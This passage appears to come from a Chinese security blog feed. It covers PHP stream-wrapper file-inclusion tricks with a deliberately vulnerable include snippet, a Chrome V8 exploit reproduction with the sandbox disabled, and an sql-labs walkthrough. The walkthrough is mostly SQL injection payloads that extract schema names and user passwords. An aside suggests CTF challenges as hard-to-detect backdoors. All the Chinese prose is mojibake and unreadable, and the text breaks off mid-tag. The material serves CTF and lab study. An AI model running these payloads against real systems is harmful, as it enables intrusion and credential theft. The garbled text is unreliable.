<h4 id="â„ï¸-php-input"><a href="#â„ï¸-php-input" class="headerlink" title="â„ï¸ php://input"></a>â„ï¸ php://input</h4><ul>
<li><p>ä½œç”¨ï¼šè®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ</p>
</li>
<li><p>æ¡ä»¶ï¼š</p>
</li>
<li><ul>
<li><code>allow_url_include</code>: <code>On</code></li>
<li>form è¡¨å•é‡Œçš„ enctype ä¸ä¸º <code>multipart/form-data</code>ï¼ˆé»˜è®¤ä¸º <code>application/x-www-form-urlencoded</code>ï¼‰ã€‚ä½“ç°åœ¨è¯·æ±‚å¤´é‡Œå°±æ˜¯ Content-Type ä¸èƒ½ä¸º <code>multipart/form-data</code></li>
</ul>
</li>
</ul>
<p>ä½œç”¨æœ‰ç‚¹æ‹—å£ï¼Œå…¶å® <code>php://input</code> å¯ä»¥ç†è§£ä¸ºâ€œæ–‡ä»¶è·¯å¾„â€ï¼Œä½†æ˜¯ PHP åœ¨é‡åˆ°è¿™ä¸ªä¼ªåè®®çš„æ—¶å€™ï¼Œä¸ä¼šçœŸå»æœ¬åœ°æ–‡ä»¶æ‰¾è¿™ä¸ªè·¯å¾„ç„¶åè¯»å–æ–‡ä»¶å†…å®¹ï¼Œè€Œæ˜¯ç›´æ¥å°† POST çš„æ•°æ®å½“åšæ–‡ä»¶å†…å®¹ã€‚</p>
<p>æ¯”å¦‚ readfileã€file_get_contentsã€includeï¼Œéƒ½æ”¯æŒæ­¤ä¼ªåè®®ã€‚</p>
<p>åœ¨ CTF ä¸­å¸¸ç”¨äºæ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</p>
<h4 id="â„ï¸-php-filter"><a href="#â„ï¸-php-filter" class="headerlink" title="â„ï¸ php://filter"></a>â„ï¸ php://filter</h4><ul>
<li>ä½œç”¨ï¼šç”¨äºæ•°æ®æµæ‰“å¼€æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œç­›é€‰ã€è¿‡æ»¤ã€‚</li>
<li>æ¡ä»¶ï¼šæ— </li>
</ul>
<p>æ ¼å¼ï¼š<code>php://filter/[0]=[1]/resource=[2]</code></p>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><code>[0]</code>: å¯é€‰ read/write</li>
<li><code>[1]</code>: å°±æ˜¯è¿‡æ»¤å™¨ï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ<code>|</code>ï¼‰åˆ†éš”å³å¯ã€‚æ¯”å¦‚ï¼š<code>convert</code>ã€<code>string</code>ï¼Œæ›´å¤šå¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZmlsdGVycy5waHA=">https://www.php.net/manual/zh/filters.php<i class="fa fa-external-link-alt"></i></span></li>
<li><code>[2]</code>: å¿…é€‰çš„å€¼ï¼Œä¸ºè¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµï¼Œé€šå¸¸æ˜¯æœ¬åœ°æ–‡ä»¶çš„è·¯å¾„ï¼Œç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„å‡å¯ä»¥ä½¿ç”¨ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>è¡¨ç¤ºè¯»å–æœ¬åœ°æ–‡ä»¶ flag.phpï¼Œå¹¶è¿›è¡Œ base64 ç¼–ç ã€‚</p>
<p>åœ¨ CTF ä¸­å¸¸ç”¨äºè¯»å– PHP çš„æºç ã€‚</p>
<h3 id="ğŸŒ§-phar"><a href="#ğŸŒ§-phar" class="headerlink" title="ğŸŒ§ phar://"></a>ğŸŒ§ phar://</h3><ul>
<li><p>ä½œç”¨ï¼šå±äº PHP ä¼ªåè®®ï¼Œpharï¼ˆPHP Archive) æ˜¯ PHP é‡Œç±»ä¼¼äº JAR çš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚</p>
</li>
<li><p>æ¡ä»¶ï¼š</p>
</li>
<li><ul>
<li>PHP &gt;= 5.3.0</li>
</ul>
</li>
</ul>
<p>phar:// çš„åˆ©ç”¨åœºæ™¯ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $files &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  include($files);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºè¿™æ ·çš„ä¾‹å­ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª zip å‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ª txt æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ï¼š<code>&lt;?php phpinfo(); ?&gt;</code>ï¼Œåœ¨çŸ¥é“ç»å¯¹è·¯å¾„ï¼ˆ/www/upload/test.zipï¼‰ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨ phar:// æ¥æ‰§è¡Œè¿™æ®µä»£ç ï¼Œpayload: <code>phar:///www/upload/test.zip/test.txt</code></p>
<p>phar:// è¿˜æœ‰ååºåˆ—åŒ–çš„åˆ©ç”¨æ–¹å¼ï¼Œç­‰åˆ°æ€»ç»“ååºåˆ—åŒ–çš„æ—¶å€™ä¸€èµ·è¯´ã€‚</p>
<h3 id="ğŸŒ§-zip"><a href="#ğŸŒ§-zip" class="headerlink" title="ğŸŒ§ zip://"></a>ğŸŒ§ zip://</h3><ul>
<li>ä½œç”¨ï¼šå±äº PHP ä¼ªåè®®ï¼Œç”¨äºè®¿é—® zip å‹ç¼©æµ</li>
</ul>
<p>æ ¼å¼ï¼š<code>zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å]</code></p>
<h3 id="ğŸŒ§-compress"><a href="#ğŸŒ§-compress" class="headerlink" title="ğŸŒ§ compress.*://"></a>ğŸŒ§ compress.*://</h3><ul>
<li>ä½œç”¨ï¼šå±äº PHP ä¼ªåè®®ï¼Œç”¨äºè®¿é—®å‹ç¼©æµ</li>
</ul>
<h4 id="â„ï¸-compress-zlib"><a href="#â„ï¸-compress-zlib" class="headerlink" title="â„ï¸ compress.zlib://"></a>â„ï¸ compress.zlib://</h4><ul>
<li>ä½œç”¨ï¼šè®¿é—® <code>.gz</code> å‹ç¼©æµ</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<ol>
<li>åˆ›å»º .gz: <code>tar -zcvf test.gz ./test.txt</code></li>
<li>payload: <code>compress.zlib://test.gz</code></li>
</ol>
<h4 id="â„ï¸-compress-bzip2"><a href="#â„ï¸-compress-bzip2" class="headerlink" title="â„ï¸ compress.bzip2://"></a>â„ï¸ compress.bzip2://</h4><ul>
<li>ä½œç”¨ï¼šè®¿é—® <code>.bz2</code> å‹ç¼©æµ</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<ol>
<li>åˆ›å»º .bz2: <code>tar -jcvf test.bz2 ./test.txt</code></li>
<li>payload: <code>compress.bzip2://test.bz2</code></li>
</ol>
<h2 id="â˜ï¸-æ€»ç»“"><a href="#â˜ï¸-æ€»ç»“" class="headerlink" title="â˜ï¸ æ€»ç»“"></a>â˜ï¸ æ€»ç»“</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4QjwHRcmh2VEMH7eHcmWdHEBaicrWVkBriav3aJFIVYbFPsaASpKnPrz88D4tERiaDaTia3nI6729uMKQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
<p>æœ€è¿‘æœ¬æ¥åœ¨å†™ SSRF çš„ï¼Œå¿«å†™å®Œäº†ï¼Œå‘ç°å…ˆå†™ä¸€ä¸‹è¿™äº›åè®®ä½œä¸ºå‰ç½®çŸ¥è¯†æ¯”è¾ƒåˆé€‚ <img src="https://mmbiz.qpic.cn/mmbiz/yZPTcMGWibvvLx6F9VHHuduYRiaYhaE4bwAY5reCwsr8ibaUfUXicKSJcOBo2kRSa1aiaTy1Ieibf15HRwZBUkN7NibGg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡">ï¼Œå½“ç„¶å®ƒä»¬å¯ä»¥é€ æˆçš„å®‰å…¨é—®é¢˜ä¸ä»…ä»…æœ‰ SSRFï¼Œè¿˜æœ‰æ–‡ä»¶åŒ…å«ç­‰ã€‚ä»ä¸ªäººç»éªŒæ¥çœ‹ï¼Œè¿™äº›åè®®è¿˜æ˜¯åœ¨ CTF ä¸­ç”¨çš„å¤šä¸€äº›ï¼Œå„å¤§ CTF ä¸­å‡ºç°è¿‡éå¸¸å¤šç²¾å½©çš„é¢˜ç›® <img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4TE7fwwzHYW0XstQ6FbOb7uB8XMPib1MNPaFA6ibicxG2we0mjZkHPDNjvDiashScfvqRvf5icd0vU2djQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡">ï¼Œæ¯”å¦‚ hxpCTF çš„ä¸€é“é€šè¿‡ file_put_contents æ¥å®Œæˆ SSRFï¼š</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ybWIxMjIuY29tLzIwMjAvMTIvMzAvaHhwLUNURi1yZXNvbmF0b3ItV3JpdGV1cC1TU1JGLXZpYS1maWxlLXB1dC1jb250ZW50cy8=">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/<i class="fa fa-external-link-alt"></i></span></p>
<p>æœ€åå¤šè¯´ä¸€å¥ï¼Œæˆ‘æ„Ÿè§‰å¾ˆå¤š CTF é¢˜ç›®å¯ä»¥ç”¨æ¥åšåé—¨ï¼Œåº”è¯¥å¾ˆéš¾æ£€æµ‹å‡ºæ¥å§â€¦<img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4TE7fwwzHYW0XstQ6FbOb7uWPflmwKia0P7aZKMpwfOALwSeVAGLr3thHxLA5fzV3MVyRc9LVLYKhg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome-0Day</title>
    <url>/posts/680dc578/</url>
    <content><![CDATA[<p>Chromeåœ¨é‡0Dayï¼Œåº”è¯¥ç®—æ˜¯1DAYäº†å§ã€‚ã€‚ã€‚</p>
<a id="more"></a>

<h2 id="Chrome-V8-RCE"><a href="#Chrome-V8-RCE" class="headerlink" title="Chrome V8 RCE"></a>Chrome V8 RCE</h2><p>4æœˆ13æ—¥ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶å‘˜ï¼ˆ<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9yNGoweDAw">Rajvardhan Agarwal<i class="fa fa-external-link-alt"></i></span>ï¼‰å‘å¸ƒäº†Chrome è¿œç¨‹ä»£ç æ‰§è¡Œ 0Dayæ¼æ´çš„PoCè¯¦æƒ…ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„çš„Webé¡µé¢ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œä¼šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ç›®å‰Googleåªé’ˆå¯¹è¯¥æ¼æ´å‘å¸ƒäº†betaæµ‹è¯•ç‰ˆChromeï¼ˆ90.0.4430.70ï¼‰ä¿®å¤ã€‚</p>
<ul>
<li>å‘å¸ƒåœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9yNGoweDAwL3N0YXR1cy8xMzgxNjQzNTI2MDEwNTk3Mzgw">https://twitter.com/r4j0x00/status/1381643526010597380<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>è¯¥æ¼æ´ä½äº V8 JavaScript å¼•æ“ä¸­ã€‚è¯¥å¼•æ“æ˜¯è´Ÿè´£å¤„ç†å’Œæ‰§è¡Œæµè§ˆå™¨å†… JavaScript ä»£ç çš„å¼€æºç»„ä»¶ã€‚</p>
<h2 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h2><ul>
<li>in V8. Chrome versions &lt;= 89.0.4389.114(RCE)</li>
</ul>
<p>æ³¨æ„âš ï¸ï¼šChromeåœ¨å…³é—­æ²™ç®±ï¼ˆé»˜è®¤å¼€å¯ï¼‰çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€ç‰¹å®šé¡µé¢ä¼šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><ul>
<li>EXPåœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3I0ajB4MDAvZXhwbG9pdHM=">https://github.com/r4j0x00/exploits<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="æ„å»ºHTTPæœåŠ¡"><a href="#æ„å»ºHTTPæœåŠ¡" class="headerlink" title="æ„å»ºHTTPæœåŠ¡"></a>æ„å»ºHTTPæœåŠ¡</h3><p>å°†EXPç›®å½•æ”¾åœ¨Webä¸‹ã€‚</p>
<p><img src="/posts/680dc578/image-20210413183657161.png" alt="image-20210413183657161"></p>
<h3 id="ğŸˆ²ï¸Chromeæ²™ç®±"><a href="#ğŸˆ²ï¸Chromeæ²™ç®±" class="headerlink" title="ğŸˆ²ï¸Chromeæ²™ç®±"></a>ğŸˆ²ï¸Chromeæ²™ç®±</h3><p>åœ¨chromeå±æ€§ä¸­æ·»åŠ <code>--no-sandbox</code>ï¼ˆå…³é—­æ²™ç®±ï¼Œé»˜è®¤æ˜¯å¯ç”¨æ²™ç®±çš„ï¼‰</p>
<p><img src="/posts/680dc578/image-20210413183225449.png" alt="image-20210413183225449"></p>
<p>è®¿é—®æ ¹ç›®å½•å¯ä»¥çœ‹åˆ°EXPï¼ˆæˆ‘è¿™é‡Œå¯ç”¨äº†ç›®å½•åˆ—è¡¨ï¼‰ã€‚</p>
<p><img src="/posts/680dc578/image-20210413183819681.png" alt="image-20210413183819681"></p>
<h3 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><p>è®¿é—®exploit.html.</p>
<p><img src="/posts/680dc578/image-20210413184006317.png" alt="image-20210413184006317"></p>
]]></content>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>sql-labs 1-37é€šå…³æ•™ç¨‹(ä»…ä½œè®°å½•)</title>
    <url>/posts/17787ced/</url>
    <content><![CDATA[<p>SQL-LABSé€šå…³æ•™ç¨‹ï¼Œä»…ä»…ä½œè®°å½•ï¼Œæœ¬èº«æ²¡å®è·µã€‚</p>
<a id="more"></a>

<ul>
<li>åŸæ–‡åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vNTJrai9wLzEyNDI2MTI0Lmh0bWw=">https://www.cnblogs.com/52kj/p/12426124.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>ç¬¬ä¸€å…³ï¼šå•å¼•å·å­—ç¬¦ä¸²å‹å›æ˜¾æ³¨å…¥<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=1â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> order by 3 â€“+ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  #<code>å¾—åˆ°åˆ—æ•°ä¸º3</code><br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 union select 1,2,3â€“+ã€€ã€€ã€€ã€€#é¡µé¢å›æ˜¾</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTM4L3NxbGktbGFicy9MZXNzLTEvP2lkPTEmIzM5Ow==">http://192.168.31.138/sqli-labs/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 union select  1,2,group_concat(schema_name) from  information_schema.schemataâ€“+ã€€ã€€ã€€ã€€#å¾—åˆ°æ•°æ®åº“åsecurity</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTM4L3NxbGktbGFicy9MZXNzLTEvP2lkPTEmIzM5Ow==">http://192.168.31.138/sqli-labs/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 union select  1,group_concat(table_name),3 from information_schema.tables where  table_schema= â€˜securityâ€™â€“+ã€€ã€€ã€€ã€€#å¾—åˆ°è¡¨åusers</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTM4L3NxbGktbGFicy9MZXNzLTEvP2lkPTEmIzM5Ow==">http://192.168.31.138/sqli-labs/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 union select  1,group_concat(column_name),3 from information_schema.columns where  table_name= â€˜usersâ€™â€“+ã€€ã€€ã€€ã€€#å¾—åˆ°åˆ—åusernameï¼Œpassword</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTM4L3NxbGktbGFicy9MZXNzLTEvP2lkPTEmIzM5Ow==">http://192.168.31.138/sqli-labs/Less-1/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 union select 1,username,password from users where id=3â€“+ã€€ã€€ã€€ã€€#<code>çˆ†ç ´å¾—åˆ°æ•°æ®åº“</code></p>
<p>ç¬¬äºŒå…³ï¼šæ•°å­—å‹å›æ˜¾æ³¨å…¥<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yLz9pZD0x">http://192.168.13.155/sqli/Less-2/?id=1<i class="fa fa-external-link-alt"></i></span> and 1=1<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yLz9pZD0x">http://192.168.13.155/sqli/Less-2/?id=1<i class="fa fa-external-link-alt"></i></span> and 1=2<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yLz9pZD0x">http://192.168.13.155/sqli/Less-2/?id=1<i class="fa fa-external-link-alt"></i></span> order by 3<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yLz9pZD0x">http://192.168.13.155/sqli/Less-2/?id=1<i class="fa fa-external-link-alt"></i></span> and 1=2 union select 1,2,3</p>
<p>ç¬¬ä¸‰å…³ï¼šå•å¼•å·å­—ç¬¦å‹å˜å½¢å›è¥¿æ˜¾æ³¨å…¥ï¼ˆå˜é‡å¼•å…¥åï¼Œç¨‹åºå¼•ç”¨æ—¶å¢åŠ äº†æ‹¬å·ï¼Œè¾“å…¥å•å¼•å·çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œnear â€˜ â€˜1â€™â€™) LIMIT 0,1â€™ ï¼Œçœ‹å‡ºå˜é‡è¢«åŠ äº†å•å¼•å·â€™å’Œæ‹¬å·)ã€‚ï¼‰<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-3/?id=1&#39;<i class="fa fa-external-link-alt"></i></span>) and 1=1â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-3/?id=1&#39;<i class="fa fa-external-link-alt"></i></span>) and 1=2 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-3/?id=1&#39;<i class="fa fa-external-link-alt"></i></span>) order by 3 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0zLz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-3/?id=1&#39;<i class="fa fa-external-link-alt"></i></span>) and 1=2 union select 1,2,3â€“+</p>
<p>ç¬¬å››å…³ï¼šåŒå¼•å·å­—ç¬¦å‹å˜å½¢å›æ˜¾æ³¨å…¥ï¼ˆå˜é‡å¼•å…¥åï¼Œç¨‹åºå¼•ç”¨æ—¶å¢åŠ äº†æ‹¬å·ï¼Œå°è¯•æ³¨å…¥è¯­å¥çœ‹æŠ¥é”™ä¿¡æ¯â€“è¾“å…¥åŒå¼•å·ï¼Œçœ‹æŠ¥é”™ä¿¡æ¯ï¼Œåé¢near â€˜â€œ1â€â€) LIMIT 0,1â€™ çœ‹å‡ºå˜é‡è¢«åŠ äº†åŒå¼•å·â€å’Œæ‹¬å·)ã€‚ï¼‰<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy00Lz9pZD0xJnF1b3Q7">http://192.168.13.155/sqli/Less-4/?id=1&quot;<i class="fa fa-external-link-alt"></i></span>) and 1=1 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy00Lz9pZD0xJnF1b3Q7">http://192.168.13.155/sqli/Less-4/?id=1&quot;<i class="fa fa-external-link-alt"></i></span>) and 1=2 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy00Lz9pZD0xJnF1b3Q7">http://192.168.13.155/sqli/Less-4/?id=1&quot;<i class="fa fa-external-link-alt"></i></span>) order by 3â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy00Lz9pZD0xJnF1b3Q7">http://192.168.13.155/sqli/Less-4/?id=1&quot;<i class="fa fa-external-link-alt"></i></span>) and 1=2 union select 1,2,3 â€“+</p>
<p>ç¬¬äº”å…³ï¼šå•å¼•å·å­—ç¬¦å‹å¸ƒå°”é€»è¾‘å‹ç›²æ³¨<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy01Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-5/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=1 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy01Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-5/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 1=2 â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy01Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-5/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> union select 1,2,3 â€“+ æ— å›æ˜¾ï¼Œéœ€è¦åˆ©ç”¨ç›²æ³¨æ–¹æ³•ï¼ˆSQLmapè·‘ï¼‰</p>
<p>ç¬¬å…­å…³ï¼šåŒå¼•å·å­—ç¬¦å‹å¸ƒå°”é€»è¾‘å‹ç›²æ³¨<br>è¾“å…¥åŒå¼•å·ï¼Œé¡µé¢æŠ¥é”™ï¼Œå¦‚near â€˜â€œ1â€â€ LIMIT 0,1â€™ï¼Œå¯ä»¥åˆ¤æ–­å˜é‡å¼•å…¥ååå°ç»™å˜é‡å¢åŠ äº†â€â€åŒå¼•å·ã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy02Lz9pZD0x">http://192.168.13.155/sqli/Less-6/?id=1<i class="fa fa-external-link-alt"></i></span> â€œ and 1=1â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy02Lz9pZD0x">http://192.168.13.155/sqli/Less-6/?id=1<i class="fa fa-external-link-alt"></i></span> â€œ and 1=2â€“+<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy02Lz9pZD0x">http://192.168.13.155/sqli/Less-6/?id=1<i class="fa fa-external-link-alt"></i></span> â€œ union select 1,2,3 â€“+  æ— å›æ˜¾ï¼Œéœ€è¦åˆ©ç”¨ç›²æ³¨æ–¹æ³•ï¼ˆSQLmapè·‘ï¼‰</p>
<p>ç¬¬ä¸ƒå…³ï¼šå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯æ³¨é‡Šç¬¦å·è¢«è¿‡æ»¤ï¼Œæ— æ³•ç”Ÿæ•ˆã€‚åªèƒ½é€šè¿‡é—­åˆå•å¼•å·å®ç°æ³¨å…¥ã€‚è¾“å…¥ä»»ä½•æ³¨é‡Šå­—ç¬¦ä¸ç”Ÿæ•ˆï¼Œæ•°æ®åº“å‡ºé”™ç»Ÿä¸€æŠ¥é”™ä¿¡æ¯æç¤ºã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy03Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-7/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and â€˜1â€™=â€™1<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy03Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-7/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and â€˜1â€™=â€™2<br>é€šè¿‡<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy03Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-7/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and 2%3E1 and â€˜1â€™=â€™1 æ„é€ ä¸€ä¸ªé€»è¾‘è¡¨è¾¾å¼å¹¶ä¸”é—­åˆåŸæœ‰å•å¼•å·ã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy03Lz9pZD0xJiMzOTs=">http://192.168.13.155/sqli/Less-7/?id=1&#39;<i class="fa fa-external-link-alt"></i></span> and ascii(substr((select schema_name from information_schema.schemata  limit 0,1),1,1))&gt;1 and â€˜1â€™=â€™1</p>
<p>ç¬¬å…«å…³ï¼šå•å¼•å·å­—ç¬¦å‹ï¼Œå¸ƒå°”é€»è¾‘ç›²æ³¨ã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy04Lz9pZD0xJTI3YW5kJTIwMT0xJTIwLS0r">http://192.168.13.155/sqli/Less-8/?id=1%27and%201=1%20--+<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy04Lz9pZD0xJTI3YW5kJTIwMT0yJTIwLS0r">http://192.168.13.155/sqli/Less-8/?id=1%27and%201=2%20--+<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy04Lz9pZD0xJTI3JTIwYW5kJTIwMT0yJTIwdW5pb24lMjBzZWxlY3QlMjAxLDIsMy0tKw==">http://192.168.13.155/sqli/Less-8/?id=1%27%20and%201=2%20union%20select%201,2,3--+<i class="fa fa-external-link-alt"></i></span> æ— å›æ˜¾</p>
<p>ç¬¬ä¹å…³ï¼šå•å¼•å·å­—ç¬¦å‹ï¼Œtime-basedç›²æ³¨<br>å¯ä»¥é€šè¿‡æ„é€ é€»è¾‘æˆ–è€…é€šè¿‡ifå‡½æ•°å®ç°æ³¨å…¥ã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy05Lz9pZD0xJTI3YW5kJTIwMT0xJTIwYW5kJTIwc2xlZXAoMyklMjAtLSs=">http://192.168.13.155/sqli/Less-9/?id=1%27and%201=1%20and%20sleep(3)%20--+<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy05Lz9pZD0xJTI3YW5kJTIwMT0yJTIwYW5kJTIwc2xlZXAoMyklMjAtLSs=">http://192.168.13.155/sqli/Less-9/?id=1%27and%201=2%20and%20sleep(3)%20--+<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" 